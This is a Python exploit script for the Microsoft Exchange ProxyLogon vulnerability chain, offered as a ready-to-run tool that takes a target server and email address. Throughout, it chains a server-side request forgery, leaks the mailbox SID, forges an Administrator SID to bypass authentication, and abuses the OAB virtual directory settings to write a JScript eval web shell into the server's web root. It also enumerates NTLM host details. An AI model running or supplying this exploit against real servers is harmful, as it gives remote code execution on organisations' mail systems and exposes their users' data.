import requests, urllib3, sys, re, base64, random
from impacket import ntlm
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def gen():
    return ''.join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(0x5))

use_name = gen()
user_agent = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36"}

shell_path = "C:\\inetpub\\wwwroot\\aspnet_client\\{}.aspx".format(use_name)
shell_src = '<script language="JScript" runat="server"> function Page_Init(){eval(Request["' + use_name + '"],"unsafe");}</script>'

autodiscover_body = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
    <Request>
      <EMailAddress>{}</EMailAddress>
      <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
    </Request>
</Autodiscover>
"""

proxylogon_body = '<r at="AuthenticationType" ln="LogonName"><s>{}</s></r>'

get_RawIdentity = {'properties':{'Parameters':{'__type':'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel','Identity': 'OAB*'}}}
OABVirtualDirectory = {'identity': {'__type': 'Identity:ECP', 'DisplayName': 'OAB (Default Web Site)', 'RawIdentity': '{}' },'properties': {'Parameters': {'__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel','ExternalUrl': 'http://host/#{}'.format(shell_src)}}}
ResetOABVirtualDirectory = {'identity': {'__type': 'Identity:ECP','DisplayName': 'OAB (Default Web Site)', 'RawIdentity': '{}' },'properties': {'Parameters': {'__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel','FilePathName': '{}'.format(shell_path) }}}

def RCE(host, email):
    session = requests.Session()
    session.headers.update(user_agent)
    
    host = host if not host.endswith("/") else host[:-1]
    print("host: {} - email: {}".format(host, email))

    print("[+] leaking required infos ..")
    CN, used_ntlm = get_CN(session, host)
    print("[*] Computer Name: {}".format(CN))

    if not used_ntlm:
        do_NTLM(session, host, just_enum=True)
    else:
        pass

    user_SID = get_SID(session, host, email, CN)
    print("[*] user SID: {}".format(user_SID))

    admin_SID = gen_admin_SID(user_SID)
    print("[*] forged Admin SID: {}".format(admin_SID))
    print("[+] Using proxylogon to get Administrator identity ..")
    asp_session, canary_cookie = proxylogon(session, host, CN, proxylogon_body.format(admin_SID), admin_SID)
    print("[*] cookie \"ASP.NET_SessionId\": {}".format(asp_session) )
    print("[*] cookie \"msExchEcpCanary\": {}".format(canary_cookie) )

    loggenAs, RBAC_roles = get_identity_info(session, host, CN)
    if loggenAs and RBAC_roles != "0":
        print("[proxylogon] Loggen as: {}".format(loggenAs))
        #print("[proxylogon] RBAC roles: {}".format(RBAC_roles))

    print("[+] dropping shell on target ..")
    drop_shell(session, host, CN, canary_cookie)
    print("[!] dropped shell on target: done!")
    shell_url = host + (shell_path.format(use_name)).split("C:\\inetpub\\wwwroot")[1].replace("\\", "/") + "?{}=RCE".format(use_name)
    print("[!] shell url: {}".format(shell_url))

    return 0

def get_CN(session, host):
    if any(char.isdigit() for char in use_name) or len(use_name) < 3:
        pattern = ''.join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(0x8))
    else:
        pattern = use_name.lower()
    ssrf_url = "[{0}]@{0}/".format(pattern)
    response = do_SSRF(session, "get", host, ssrf_url)
    if "NegotiateSecurityContext failed" not in response.text and pattern not in response.text and pattern != response.headers["X-CalculatedBETarget"]:
        print("[!] It seems that {} is not vulnerable! Aborting ..".format(host.split("://")[1]))
        exit(1)

    if "X-FEServer" in response.headers.keys():
        return response.headers["X-FEServer"], False
    else:
        print("[WARNING] backend name not found in response headers")
        print("[+] trying to get backend name using NTLM auth ..")
        return do_NTLM(session, host), True

def get_SID(session, host, email, CN):
    legacyDN, DC_address, RPC_address = get_legacyDN(session, host, email, CN)
    print("[*] Domain Controller: {}".format(DC_address))
    print("[*] LegacyExchangeDN of the mailbox ({}): {}".format(email, legacyDN))
    return get_MAPI_error(session, host, CN, legacyDN)
    

def get_legacyDN(session, host, email, CN):
    ssrf_url = "[{}]@{}:444/autodiscover/autodiscover.xml".format(use_name, CN)
    content_type = {"Content-Type": "text/xml"}
    response = do_SSRF(session, "post", host, ssrf_url, ssrf_data=autodiscover_body.format(email), ssrf_headers=content_type)
    
    if response.status_code != 200:
        print("[ERROR] failed to get LegacyExchangeDN of the mailbox! Aborting ..")
        exit(1)

    LegacyDN = re.findall(rb'<LegacyDN>(.+?)</LegacyDN>', response.content)
    DC_address = re.findall(rb'<AD>(.+?)</AD>', response.content)
    RPC_address = re.findall(rb'<Server>(.+?)</Server>', response.content)

    if len(LegacyDN) == 0 or len(DC_address) == 0 or len(RPC_address) == 0:
        print("[ERROR] the email you provided is invalid!")
        print_exch_error(response)
        exit(1)
    else:
        LegacyDN = LegacyDN[0].decode("utf-8")
        DC_address = DC_address[0].decode("utf-8")
        RPC_address  = RPC_address[0].decode("utf-8")

    return LegacyDN, DC_address, RPC_address

def get_MAPI_error(session, host, CN, legacyDN):
    ssrf_url = "[{}]@{}:444/mapi/emsmdb?MailboxId=asdfasdf-asdfasdf-asdfasdf-asdfasdf-asdfasdf@asdfasdf.com".format(use_name, CN)
    headers = {"Content-Type": "application/mapi-http", "X-Clientapplication": "Outlook/15.0.5327.1000", "X-Requesttype": "Connect", "X-RequestId": "asdf-asdf-asdf-asdf"}  
    
    payload = legacyDN
    for i in range(0x15):
        payload += '\x00'

    response = do_SSRF(session, "post", host, ssrf_url, ssrf_data=payload, ssrf_headers=headers)

    if response.status_code != 200 or "act as owner of a UserMailbox" not in response.text:
        print("[ERROR] Error while trying to get SID")
        exit(1)
    
    SID = re.findall(rb'with SID (.+?) and MasterAccountSid', response.content)
    if len(SID) == 0:
        print("[ERROR] couldn't get SID!")
        print_exch_error(response)
        exit(1)
    else:
        SID = SID[0]

    return SID.decode("utf-8")

def gen_admin_SID(user_SID):
    admin_SID = user_SID[:user_SID.rfind('-')+1]
    admin_SID += "500"
    return admin_SID

def proxylogon(session, host, CN, proxylogon_body, target_SID):
    ssrf_url = "[{}]@{}:444/ecp/proxyLogon.ecp".format(use_name, CN)
    magic_header = {"msExchLogonMailbox": target_SID}
    session.headers.update(magic_header)
    headers = {"Content-Type": "text/xml"}
    session.cookies.clear()
    response = do_SSRF(session, "post", host, ssrf_url, ssrf_data=proxylogon_body, ssrf_headers=headers)
    
    if response.status_code != 241:
        print("[ERROR] proxylogon(): status_code != 241")
        print_exch_error(response)
        exit(1)

    cookies = {"ASP.NET_SessionId": "cookie_default_value", "msExchEcpCanary": "cookie_default_value"}
    for cookie in cookies.keys():
        try: 
            cookies[cookie] = response.cookies[cookie]
        except:
            print("[WARNING] we didn't get \"{}\" cookie, the attack will likely fail!".format(cookie))
    return cookies.values()

def get_identity_info(session, host, CN):
    ssrf_url = "[{}]@{}:444/ecp/about.aspx".format(use_name, CN)
    response = do_SSRF(session, "get", host, ssrf_url)
    loggenAs, RBAC_roles = "0", "0"

    if response.status_code == 200:
        loggenAs = re.findall(r'Logon user:</span> <span class=\'diagTxt\'>(.+?)</span>', response.text)
        RBAC_roles = re.findall(r'RBAC roles:</span> <span class=\'diagTxt\'>(.+?)</span>', response.text)
        if len(loggenAs) == 0 or len(RBAC_roles) == 0:
            print("[WARNING] error while getting our new identity infos: server returned 200 OK but no data found")
            print_exch_error(response)
            print("[WARNING] continuing the attack anyway!")
    else:
        print("[WARNING] error while getting our new identity infos: server responded with: {}".format(response.status_code))
        print_exch_error(response)
        print("[WARNING] continuing the attack anyway!")
    
    return loggenAs[0], RBAC_roles[0]

def drop_shell(session, host, CN, ECP_canary):
    OABid =  get_OABid(session, host, CN, ECP_canary)
    print("[*] RawIdentity: {}".format(OABid))

    ssrf_url = "[{}]@{}:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary={}".format(use_name, CN, ECP_canary)
    content_type = {"Content-Type": "application/json"}
    OABVirtualDirectory["identity"]["RawIdentity"] = OABid
    json_payload = OABVirtualDirectory
    response = do_SSRF(session, "post", host, ssrf_url, ssrf_data=json_payload, ssrf_headers=content_type, is_json=1)
    if response.status_code != 200:
            print("[ERROR] Error while droping shell")
            print_exch_error(response)
            exit(1)
    
    ssrf_url = "[{}]@{}:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary={}".format(use_name, CN, ECP_canary)
    ResetOABVirtualDirectory["identity"]["RawIdentity"] = OABid
    json_payload = ResetOABVirtualDirectory
    response = do_SSRF(session, "post", host, ssrf_url, ssrf_data=json_payload, ssrf_headers=content_type, is_json=1)
    if response.status_code != 200:
            print("[ERROR] Error while droping shell")
            print_exch_error(response)
            exit(1)
        
    return 0 

def get_OABid(session, host, CN, ECP_canary):
    ssrf_url = "[{}]@{}:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary={}".format(use_name, CN, ECP_canary)
    content_type = {"Content-Type": "application/json"}
    json_payload = get_RawIdentity

    response = do_SSRF(session, "post", host, ssrf_url, ssrf_data=json_payload, ssrf_headers=content_type, is_json=1)
    content = response.content
    
    OABid = re.findall(rb'"RawIdentity":"(.+?)"', response.content)
    if len(OABid) == 0:
        print("[ERROR] couldn't get RawIdentity!")
        print_exch_error(response)
        exit(1)
    else:
        OABid = OABid[0]
    
    return OABid.decode("utf-8")

def do_SSRF(session, method, host, ssrf_url, ssrf_data={}, ssrf_cookies={}, ssrf_headers={}, is_json=0):
    magic_path = "/ecp/"
    magic_ext = ".ico"
    magic_cookie_name = "X-BEResource"
    magic_version = "#version=~1941962753"
    magic_url = host + magic_path + use_name + magic_ext
    magic_cookie = {magic_cookie_name: ssrf_url + magic_version}

    if not ssrf_cookies:
        ssrf_cookies = magic_cookie
    else:
        ssrf_cookies.update(magic_cookie)

    if method == "get":
        return session.get(magic_url, cookies=ssrf_cookies, verify=False)
    else:
        return session.post(magic_url, json=ssrf_data, cookies=ssrf_cookies, headers=ssrf_headers, verify=False) if is_json else session.post(magic_url, data=ssrf_data, cookies=ssrf_cookies, headers=ssrf_headers, verify=False)

def print_exch_error(response):
    if 'Error' in response.text and 'Message' in response.text:
            if "xml" in response.headers["Content-Type"]:
                errors = re.findall(r'<Message>(.+?)</Message>', response.text)
                for err in errors:
                    print("[ERROR] Error from Exchange: \"{}\"".format(err))
            elif "json" in response.headers["Content-Type"]:
                errors = re.findall(r'"Message":"(.+?)\w*(?<!\\)"', response.text)
                for err in errors:
                    print("[ERROR] Error from Exchange: \"{}\"".format(err))
    return 0


def do_NTLM(session, host, RPC_address=None, just_enum=False):
    rpc_proxy = "/rpcproxy.dll"
    rpc_proxy_fallback = "/RpcProxyShim.dll"
    rpc_url = host + "/rpc"
   
    url = rpc_url
    if not ntlm_exposed(session, rpc_url):
        url = rpc_url + rpc_proxy
        if not ntlm_exposed(session, url):
            url = rpc_url + rpc_proxy_fallback
            if not ntlm_exposed(session, url):
                print("[LOG] NTLM authentication is not enabled!")
                if not just_enum:
                    print("[ERROR] backend name is required for the exploit! Aborting ..")
                    exit(1)
                else:
                    return 0
    
    print("[LOG] NTLM authentication is enabled! enumerating infos ..")

    response = session.get(url, verify=False)
    
    www_auth = response.headers["WWW-Authenticate"]
    server_challenge_b64 = re.search('NTLM ([a-zA-Z0-9+/]+={0,2})', www_auth).group(1)
    server_challenge = base64.b64decode(server_challenge_b64)

    print("TargetInfo:")
    version = parse_version(server_challenge[48:56])
    print("\t[NTLM] Version: {}".format(version))

    challenge = ntlm.NTLMAuthChallenge(server_challenge)
    ntlmssp_info = ntlm.AV_PAIRS(challenge['TargetInfoFields'])
    
    for i in list(ntlmssp_info.fields.keys()):
            x, y = ntlmssp_info[i]
            if i == 1:
                CN = y.decode('utf-16') 
                print("\t[NTLM] computer name: {}".format(CN))
            elif i == 2:
                DN = y.decode('utf-16')
                print("\t[NTLM] domain name: {}".format(DN))
            elif i == 3:
                CN_FQDN = y.decode('utf-16')
                print("\t[NTLM] DNS computer name (FQDN): {}".format(CN_FQDN))
            elif i == 4:
                DN_FQDN = y.decode('utf-16')
                print("\t[NTLM] DNS domain name (FQDN): {}".format(DN_FQDN))
            elif i == 5:
                tree_FQDN = y.decode('utf-16')
                print("\t[NTLM] DNS tree name (FQDN): {}".format(tree_FQDN))

    del session.headers["Authorization"]
    return 0 if just_enum else CN

def ntlm_exposed(session, url):
    auth_request = {"Authorization": "NTLM TlRMTVNTUAABAAAABQKIoAAAAAAAAAAAAAAAAAAAAAA="}
    session.headers.update(auth_request)
    response = session.get(url, verify=False)

    if "NTLM" in response.headers["WWW-Authenticate"] and "Negotiate" in response.headers["WWW-Authenticate"]:
            return True
    else:
            return False

# parse_version() is slightly modified, used to parse the version from the challenge, from https://github.com/b17zr/ntlm_challenger/blob/master/ntlm_challenger.py
def parse_version(version_bytes):
    major_version = version_bytes[0]
    minor_version = version_bytes[1]
    product_build = int.from_bytes(version_bytes[2:4], 'little')

    version = 'Unknown'

    if major_version == 5 and minor_version == 1:
        version = 'Windows XP (SP2)'
    elif major_version == 5 and minor_version == 2:
        version = 'Server 2003'
    elif major_version == 6 and minor_version == 0:
        version = 'Server 2008 / Windows Vista'
    elif major_version == 6 and minor_version == 1:
        version = 'Server 2008 R2 / Windows 7'
    elif major_version == 6 and minor_version == 2:
        version = 'Server 2012 / Windows 8'
    elif major_version == 6 and minor_version == 3:
        version = 'Server 2012 R2 / Windows 8.1'
    elif major_version == 10 and minor_version == 0:
        version = 'Server 2016 or 2019 / Windows 10'

    return '{} (build {})'.format(version, product_build)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 {} https://mail.corp.com email@corp.com".format(sys.argv[0]))
        exit(1)
    
    RCE(sys.argv[1], sys.argv[2])
